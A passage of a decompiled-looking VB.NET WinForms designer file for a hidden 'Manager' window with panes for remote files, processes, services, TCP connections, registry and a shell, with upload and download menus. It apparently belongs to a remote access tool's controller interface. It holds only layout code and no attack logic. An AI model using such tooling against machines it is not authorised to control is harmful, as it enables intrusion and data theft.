        Me.MG.TransparentColor = System.Drawing.Color.Transparent
        Me.MG.Images.SetKeyName(0, "Treetog-Junior-Folder-open.ico")
        Me.MG.Images.SetKeyName(1, "Oxygen-Icons.org-Oxygen-Devices-drive-harddisk.ico")
        Me.MG.Images.SetKeyName(2, "Babasse-Bagg-And-Boxs-Lecteur-box-DVD.ico")
        Me.MG.Images.SetKeyName(3, "Aha-Soft-Torrent-Download.ico")
        Me.MG.Images.SetKeyName(4, "6.bmp")
        Me.MG.Images.SetKeyName(5, "Oxygen-Icons.org-Oxygen-Apps-preferences-system-network-sharing.ico")
        '
        'ListView1
        '
        Me.ListView1.Activation = System.Windows.Forms.ItemActivation.OneClick
        Me.ListView1.BackColor = System.Drawing.Color.Black
        Me.ListView1.Columns.AddRange(New System.Windows.Forms.ColumnHeader() {Me.ColumnHeader1, Me.ColumnHeader2})
        Me.ListView1.Dock = System.Windows.Forms.DockStyle.Top
        Me.ListView1.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.ListView1.ForeColor = System.Drawing.Color.LightSteelBlue
        Me.ListView1.HeaderStyle = System.Windows.Forms.ColumnHeaderStyle.None
        Me.ListView1.HotTracking = True
        Me.ListView1.HoverSelection = True
        ListViewItem1.Tag = ""
        ListViewItem2.Tag = "0"
        ListViewItem3.Tag = "1"
        ListViewItem4.Tag = "2"
        ListViewItem5.Tag = "3"
        ListViewItem6.Tag = "4"
        Me.ListView1.Items.AddRange(New System.Windows.Forms.ListViewItem() {ListViewItem1, ListViewItem2, ListViewItem3, ListViewItem4, ListViewItem5, ListViewItem6})
        Me.ListView1.LargeImageList = Me.ImageList1
        Me.ListView1.Location = New System.Drawing.Point(0, 0)
        Me.ListView1.MultiSelect = False
        Me.ListView1.Name = "ListView1"
        Me.ListView1.Scrollable = False
        Me.ListView1.Size = New System.Drawing.Size(667, 52)
        Me.ListView1.SmallImageList = Me.ImageList1
        Me.ListView1.TabIndex = 9
        Me.ListView1.TileSize = New System.Drawing.Size(130, 25)
        Me.ListView1.UseCompatibleStateImageBehavior = False
        Me.ListView1.View = System.Windows.Forms.View.Tile
        '
        'vmethod_148
        '
        Me.vmethod_148.ColorDepth = System.Windows.Forms.ColorDepth.Depth8Bit
        Me.vmethod_148.ImageSize = New System.Drawing.Size(16, 16)
        Me.vmethod_148.TransparentColor = System.Drawing.Color.Transparent
        '
        'vmethod_108
        '
        Me.vmethod_108.ColorDepth = System.Windows.Forms.ColorDepth.Depth32Bit
        Me.vmethod_108.ImageSize = New System.Drawing.Size(20, 20)
        Me.vmethod_108.TransparentColor = System.Drawing.Color.Transparent
        '
        'FMM
        '
        Me.FMM.Controls.Add(Me.LSRV)
        Me.FMM.Controls.Add(Me.LPR)
        Me.FMM.Controls.Add(Me.TextBox1)
        Me.FMM.Controls.Add(Me.L1)
        Me.FMM.Controls.Add(Me.p)
        Me.FMM.Controls.Add(Me.L2)
        Me.FMM.Controls.Add(Me.LTCP)
        Me.FMM.Controls.Add(Me.RG)
        Me.FMM.Controls.Add(Me.sh)
        Me.FMM.Dock = System.Windows.Forms.DockStyle.Fill
        Me.FMM.Location = New System.Drawing.Point(0, 52)
        Me.FMM.Name = "FMM"
        Me.FMM.Size = New System.Drawing.Size(667, 271)
        Me.FMM.TabIndex = 49
        '
        'LSRV
        '
        Me.LSRV.BackColor = System.Drawing.Color.Black
        Me.LSRV.Columns.AddRange(New System.Windows.Forms.ColumnHeader() {Me.ColumnHeader11, Me.ColumnHeader12, Me.ColumnHeader13, Me.ColumnHeader14, Me.ColumnHeader15})
        Me.LSRV.ContextMenuStrip = Me.ContextMenuStrip2
        Me.LSRV.Dock = System.Windows.Forms.DockStyle.Fill
        Me.LSRV.Font = New System.Drawing.Font("Arial", 8.0!, System.Drawing.FontStyle.Bold)
        Me.LSRV.ForeColor = System.Drawing.Color.LightSteelBlue
        Me.LSRV.FullRowSelect = True
        Me.LSRV.GridLines = True
        Me.LSRV.Location = New System.Drawing.Point(0, 0)
        Me.LSRV.Name = "LSRV"
        Me.LSRV.OwnerDraw = True
        Me.LSRV.ShowItemToolTips = True
        Me.LSRV.Size = New System.Drawing.Size(667, 271)
        Me.LSRV.TabIndex = 55
        Me.LSRV.UseCompatibleStateImageBehavior = False
        Me.LSRV.View = System.Windows.Forms.View.Details
        '
        'ColumnHeader11
        '
        Me.ColumnHeader11.Text = "Service"
        '
        'ColumnHeader12
        '
        Me.ColumnHeader12.Text = "Display Name"
        '
        'ColumnHeader13
        '
        Me.ColumnHeader13.Text = "Type"
        '
        'ColumnHeader14
        '
        Me.ColumnHeader14.Text = "Status"
        '
        'ColumnHeader15
        '
        Me.ColumnHeader15.Text = "Can Stop?"
        Me.ColumnHeader15.Width = 423
        '
        'LPR
        '
        Me.LPR.BackColor = System.Drawing.Color.Black
        Me.LPR.Columns.AddRange(New System.Windows.Forms.ColumnHeader() {Me.ColumnHeader22, Me.ColumnHeader23, Me.ColumnHeader24, Me.ColumnHeader25, Me.ColumnHeader26})
        Me.LPR.ContextMenuStrip = Me.M1
        Me.LPR.Dock = System.Windows.Forms.DockStyle.Fill
        Me.LPR.Font = New System.Drawing.Font("Arial", 8.0!, System.Drawing.FontStyle.Bold)
        Me.LPR.ForeColor = System.Drawing.Color.LightSteelBlue
        Me.LPR.FullRowSelect = True
        Me.LPR.GridLines = True
        Me.LPR.Location = New System.Drawing.Point(0, 0)
        Me.LPR.Name = "LPR"
        Me.LPR.OwnerDraw = True
        Me.LPR.ShowItemToolTips = True
        Me.LPR.Size = New System.Drawing.Size(667, 271)
        Me.LPR.TabIndex = 54
        Me.LPR.UseCompatibleStateImageBehavior = False
        Me.LPR.View = System.Windows.Forms.View.Details
        '
        'ColumnHeader22
        '
        Me.ColumnHeader22.Text = "Name"
        '
        'ColumnHeader23
        '
        Me.ColumnHeader23.Text = "PID"
        Me.ColumnHeader23.Width = 49
        '
        'ColumnHeader24
        '
        Me.ColumnHeader24.Text = "Directory"
        Me.ColumnHeader24.Width = 116
        '
        'ColumnHeader25
        '
        Me.ColumnHeader25.Text = "User"
        '
        'ColumnHeader26
        '
        Me.ColumnHeader26.Text = "CommandLine"
        Me.ColumnHeader26.Width = 378
        '
        'TextBox1
        '
        Me.TextBox1.Anchor = CType(((System.Windows.Forms.AnchorStyles.Top Or System.Windows.Forms.AnchorStyles.Left) _
            Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.TextBox1.Location = New System.Drawing.Point(194, 0)
        Me.TextBox1.Name = "TextBox1"
        Me.TextBox1.ReadOnly = True
        Me.TextBox1.Size = New System.Drawing.Size(473, 20)
        Me.TextBox1.TabIndex = 32
        '
        'L1
        '
        Me.L1.Anchor = CType(((System.Windows.Forms.AnchorStyles.Top Or System.Windows.Forms.AnchorStyles.Bottom) _
            Or System.Windows.Forms.AnchorStyles.Left), System.Windows.Forms.AnchorStyles)
        Me.L1.BackColor = System.Drawing.Color.Black
        Me.L1.Columns.AddRange(New System.Windows.Forms.ColumnHeader() {Me.ColumnHeader6, Me.ColumnHeader7})
        Me.L1.ContextMenuStrip = Me.ContextMenuStrip4
        Me.L1.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold)
        Me.L1.ForeColor = System.Drawing.Color.LightSteelBlue
        Me.L1.FullRowSelect = True
        Me.L1.LargeImageList = Me.MG
        Me.L1.Location = New System.Drawing.Point(0, 0)
        Me.L1.Name = "L1"
        Me.L1.OwnerDraw = True
        Me.L1.Size = New System.Drawing.Size(194, 283)
        Me.L1.SmallImageList = Me.MG
        Me.L1.TabIndex = 21
        Me.L1.UseCompatibleStateImageBehavior = False
        Me.L1.View = System.Windows.Forms.View.Details
        '
        'ColumnHeader6
        '
        Me.ColumnHeader6.Text = "Name"
        Me.ColumnHeader6.Width = 106
        '
        'ColumnHeader7
        '
        Me.ColumnHeader7.Text = "Type"
        Me.ColumnHeader7.Width = 84
        '
        'p
        '
        Me.p.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.p.Location = New System.Drawing.Point(390, 114)
        Me.p.Name = "p"
        Me.p.Size = New System.Drawing.Size(197, 126)
        Me.p.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom
        Me.p.TabIndex = 31
        Me.p.TabStop = False
        '
        'L2
        '
        Me.L2.Anchor = CType((((System.Windows.Forms.AnchorStyles.Top Or System.Windows.Forms.AnchorStyles.Bottom) _
            Or System.Windows.Forms.AnchorStyles.Left) _
            Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.L2.BackColor = System.Drawing.Color.Black
        Me.L2.Columns.AddRange(New System.Windows.Forms.ColumnHeader() {Me.ColumnHeader8, Me.ColumnHeader9, Me.ColumnHeader10})
        Me.L2.ContextMenuStrip = Me.ContextMenuStrip3
        Me.L2.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold)
        Me.L2.ForeColor = System.Drawing.Color.LightSteelBlue
        Me.L2.FullRowSelect = True
        Me.L2.LargeImageList = Me.vmethod_108
        Me.L2.Location = New System.Drawing.Point(194, 21)
        Me.L2.Name = "L2"
        Me.L2.OwnerDraw = True
        Me.L2.ShowItemToolTips = True
        Me.L2.Size = New System.Drawing.Size(473, 250)
        Me.L2.SmallImageList = Me.vmethod_108
        Me.L2.TabIndex = 23
        Me.L2.TileSize = New System.Drawing.Size(60, 40)
        Me.L2.UseCompatibleStateImageBehavior = False
        Me.L2.View = System.Windows.Forms.View.Details
        '
        'ColumnHeader8
        '
        Me.ColumnHeader8.Text = "Name"
        Me.ColumnHeader8.Width = 165
        '
        'ColumnHeader9
        '
        Me.ColumnHeader9.Text = "Size"
        Me.ColumnHeader9.Width = 93
        '
        'ColumnHeader10
        '
        Me.ColumnHeader10.Text = "Type"
        Me.ColumnHeader10.Width = 211
        '
        'LTCP
        '
        Me.LTCP.BackColor = System.Drawing.Color.Black
        Me.LTCP.Columns.AddRange(New System.Windows.Forms.ColumnHeader() {Me.ColumnHeader16, Me.ColumnHeader17, Me.ColumnHeader18, Me.ColumnHeader19, Me.ColumnHeader20, Me.ColumnHeader21})
        Me.LTCP.ContextMenuStrip = Me.ContextMenuStrip1
        Me.LTCP.Dock = System.Windows.Forms.DockStyle.Fill
        Me.LTCP.Font = New System.Drawing.Font("Arial", 8.0!, System.Drawing.FontStyle.Bold)
        Me.LTCP.ForeColor = System.Drawing.Color.LightSteelBlue
        Me.LTCP.FullRowSelect = True
        Me.LTCP.GridLines = True
        Me.LTCP.Location = New System.Drawing.Point(0, 0)
        Me.LTCP.Name = "LTCP"
        Me.LTCP.OwnerDraw = True
        Me.LTCP.ShowItemToolTips = True
        Me.LTCP.Size = New System.Drawing.Size(667, 271)
        Me.LTCP.TabIndex = 48
        Me.LTCP.UseCompatibleStateImageBehavior = False
        Me.LTCP.View = System.Windows.Forms.View.Details
        '
        'ColumnHeader16
        '
        Me.ColumnHeader16.Text = "LocalIP"
        '
        'ColumnHeader17
        '
        Me.ColumnHeader17.Text = "LocalPort"
        '
        'ColumnHeader18
        '
        Me.ColumnHeader18.Text = "RemoteIP"
        Me.ColumnHeader18.Width = 116
        '
        'ColumnHeader19
        '
        Me.ColumnHeader19.Text = "RemotePort"
        '
        'ColumnHeader20
        '
        Me.ColumnHeader20.Text = "State"
        '
        'ColumnHeader21
        '
        Me.ColumnHeader21.Text = "Process"
        Me.ColumnHeader21.Width = 307
        '
        'RG
        '
        Me.RG.Controls.Add(Me.RGLIST)
        Me.RG.Controls.Add(Me.RGk)
        Me.RG.Dock = System.Windows.Forms.DockStyle.Fill
        Me.RG.Location = New System.Drawing.Point(0, 0)
        Me.RG.Name = "RG"
        Me.RG.Size = New System.Drawing.Size(667, 271)
        Me.RG.TabIndex = 52
        '
        'RGLIST
        '
        Me.RGLIST.Anchor = CType((((System.Windows.Forms.AnchorStyles.Top Or System.Windows.Forms.AnchorStyles.Bottom) _
            Or System.Windows.Forms.AnchorStyles.Left) _
            Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.RGLIST.BackColor = System.Drawing.Color.Black
        Me.RGLIST.Columns.AddRange(New System.Windows.Forms.ColumnHeader() {Me.ColumnHeader3, Me.ColumnHeader4, Me.ColumnHeader5})
        Me.RGLIST.ContextMenuStrip = Me.crg
        Me.RGLIST.Font = New System.Drawing.Font("Arial", 8.0!, System.Drawing.FontStyle.Bold)
        Me.RGLIST.ForeColor = System.Drawing.Color.LightSteelBlue
        Me.RGLIST.FullRowSelect = True
        Me.RGLIST.LargeImageList = Me.rimg
        Me.RGLIST.Location = New System.Drawing.Point(200, 0)
        Me.RGLIST.Name = "RGLIST"
        Me.RGLIST.OwnerDraw = True
        Me.RGLIST.Size = New System.Drawing.Size(467, 271)
        Me.RGLIST.SmallImageList = Me.rimg
        Me.RGLIST.TabIndex = 18
        Me.RGLIST.UseCompatibleStateImageBehavior = False
        Me.RGLIST.View = System.Windows.Forms.View.Details
        '
        'ColumnHeader3
        '
        Me.ColumnHeader3.Text = "Name"
        Me.ColumnHeader3.Width = 109
        '
        'ColumnHeader4
        '
        Me.ColumnHeader4.Text = "Type"
        Me.ColumnHeader4.Width = 109
        '
        'ColumnHeader5
        '
        Me.ColumnHeader5.Text = "Value"
        Me.ColumnHeader5.Width = 245
        '
        'RGk
        '
        Me.RGk.Anchor = CType(((System.Windows.Forms.AnchorStyles.Top Or System.Windows.Forms.AnchorStyles.Bottom) _
            Or System.Windows.Forms.AnchorStyles.Left), System.Windows.Forms.AnchorStyles)
        Me.RGk.BackColor = System.Drawing.Color.Black
        Me.RGk.ContextMenuStrip = Me.crgk
        Me.RGk.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.RGk.ForeColor = System.Drawing.Color.LightSteelBlue
        Me.RGk.ImageIndex = 0
        Me.RGk.ImageList = Me.rimg
        Me.RGk.Location = New System.Drawing.Point(0, 0)
        Me.RGk.Name = "RGk"
        Me.RGk.SelectedImageIndex = 0
        Me.RGk.Size = New System.Drawing.Size(200, 271)
        Me.RGk.TabIndex = 14
        '
        'sh
        '
        Me.sh.Controls.Add(Me.T1)
        Me.sh.Controls.Add(Me.T2)
        Me.sh.Dock = System.Windows.Forms.DockStyle.Fill
        Me.sh.Location = New System.Drawing.Point(0, 0)
        Me.sh.Name = "sh"
        Me.sh.Size = New System.Drawing.Size(667, 271)
        Me.sh.TabIndex = 53
        '
        'T1
        '
        Me.T1.Anchor = CType(((System.Windows.Forms.AnchorStyles.Top Or System.Windows.Forms.AnchorStyles.Left) _
            Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.T1.BackColor = System.Drawing.Color.Black
        Me.T1.BorderStyle = System.Windows.Forms.BorderStyle.None
        Me.T1.Cursor = System.Windows.Forms.Cursors.Arrow
        Me.T1.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.T1.ForeColor = System.Drawing.Color.LightSteelBlue
        Me.T1.Location = New System.Drawing.Point(0, 0)
        Me.T1.Name = "T1"
        Me.T1.ReadOnly = True
        Me.T1.Size = New System.Drawing.Size(667, 251)
        Me.T1.TabIndex = 4
        Me.T1.Text = ""
        '
        'T2
        '
        Me.T2.Anchor = CType(((System.Windows.Forms.AnchorStyles.Bottom Or System.Windows.Forms.AnchorStyles.Left) _
            Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.T2.BackColor = System.Drawing.Color.Gray
        Me.T2.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.T2.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.T2.ForeColor = System.Drawing.Color.LightSteelBlue
        Me.T2.Location = New System.Drawing.Point(0, 251)
        Me.T2.Name = "T2"
        Me.T2.ReadOnly = True
        Me.T2.Size = New System.Drawing.Size(667, 20)
        Me.T2.TabIndex = 3
        '
        'Manager
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.BackColor = System.Drawing.Color.Black
        Me.ClientSize = New System.Drawing.Size(667, 345)
        Me.Controls.Add(Me.FMM)
        Me.Controls.Add(Me.ListView1)
        Me.Controls.Add(Me.StatusStrip1)
        Me.Name = "Manager"
        Me.ShowIcon = False
        Me.ShowInTaskbar = False
        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
        Me.Text = "Manager"
        Me.StatusStrip1.ResumeLayout(False)
        Me.StatusStrip1.PerformLayout()
        Me.M1.ResumeLayout(False)
        Me.ContextMenuStrip1.ResumeLayout(False)
        Me.crg.ResumeLayout(False)
        Me.crgk.ResumeLayout(False)
        Me.ContextMenuStrip2.ResumeLayout(False)
        Me.ContextMenuStrip3.ResumeLayout(False)
        Me.ContextMenuStrip4.ResumeLayout(False)
        Me.FMM.ResumeLayout(False)
        Me.FMM.PerformLayout()
        CType(Me.p, System.ComponentModel.ISupportInitialize).EndInit()
        Me.RG.ResumeLayout(False)
        Me.sh.ResumeLayout(False)
        Me.sh.PerformLayout()
        Me.ResumeLayout(False)
        Me.PerformLayout()

    End Sub
    Friend WithEvents StatusStrip1 As System.Windows.Forms.StatusStrip
    Friend WithEvents SL As System.Windows.Forms.ToolStripStatusLabel
    Friend WithEvents pr As System.Windows.Forms.ToolStripProgressBar
    Friend WithEvents M1 As System.Windows.Forms.ContextMenuStrip
    Friend WithEvents KillToolStripMenuItem1 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents KillDeleteToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents RestartProcessToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents vmethod_26 As System.Windows.Forms.Timer
    Friend WithEvents ImageList1 As System.Windows.Forms.ImageList
    Friend WithEvents ContextMenuStrip1 As System.Windows.Forms.ContextMenuStrip
    Friend WithEvents KillConnectionToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents crg As System.Windows.Forms.ContextMenuStrip
    Friend WithEvents RefreshToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents EditToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents NewValueToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents DeleteToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents rimg As System.Windows.Forms.ImageList
    Friend WithEvents crgk As System.Windows.Forms.ContextMenuStrip
    Friend WithEvents RefreshToolStripMenuItem1 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents CreateKeyToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents DeleteSelectedToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ContextMenuStrip2 As System.Windows.Forms.ContextMenuStrip
    Friend WithEvents StopToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents PauseToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents StartToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ContextMenuStrip3 As System.Windows.Forms.ContextMenuStrip
    Friend WithEvents UPToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents RefreshToolStripMenuItem2 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents RunToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents DeleteToolStripMenuItem1 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents EditToolStripMenuItem1 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents RenameToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents CopyToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents CutToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents PasteToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents DownloadToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents UploadToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents NewEmptyFileToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents NewFolderToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents OpenDownloadsToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents RarToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents UnRarToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents UploadFromLinkToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ContextMenuStrip4 As System.Windows.Forms.ContextMenuStrip
    Friend WithEvents RefreshToolStripMenuItem3 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents MG As System.Windows.Forms.ImageList
    Friend WithEvents ListView1 As System.Windows.Forms.ListView
    Friend WithEvents ColumnHeader1 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader2 As System.Windows.Forms.ColumnHeader
    Friend WithEvents vmethod_148 As System.Windows.Forms.ImageList
    Friend WithEvents Timer1 As System.Windows.Forms.Timer
    Friend WithEvents FMM As System.Windows.Forms.Panel
    Friend WithEvents TextBox1 As System.Windows.Forms.TextBox
    Friend WithEvents L1 As GClass9
    Friend WithEvents ColumnHeader6 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader7 As System.Windows.Forms.ColumnHeader
    Friend WithEvents p As System.Windows.Forms.PictureBox
    Friend WithEvents L2 As GClass9
    Friend WithEvents ColumnHeader8 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader9 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader10 As System.Windows.Forms.ColumnHeader
    Friend WithEvents LTCP As GClass9
    Friend WithEvents ColumnHeader16 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader17 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader18 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader19 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader20 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader21 As System.Windows.Forms.ColumnHeader
    Friend WithEvents RG As System.Windows.Forms.Panel
    Friend WithEvents RGLIST As GClass9
    Friend WithEvents ColumnHeader3 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader4 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader5 As System.Windows.Forms.ColumnHeader
    Friend WithEvents RGk As System.Windows.Forms.TreeView
    Friend WithEvents sh As System.Windows.Forms.Panel
    Friend WithEvents T1 As System.Windows.Forms.RichTextBox
    Friend WithEvents T2 As System.Windows.Forms.TextBox
    Friend WithEvents LPR As GClass9
    Friend WithEvents ColumnHeader22 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader23 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader24 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader25 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader26 As System.Windows.Forms.ColumnHeader
    Friend WithEvents LSRV As GClass9
    Friend WithEvents ColumnHeader11 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader12 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader13 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader14 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader15 As System.Windows.Forms.ColumnHeader
    Friend WithEvents vmethod_108 As System.Windows.Forms.ImageList
End Class
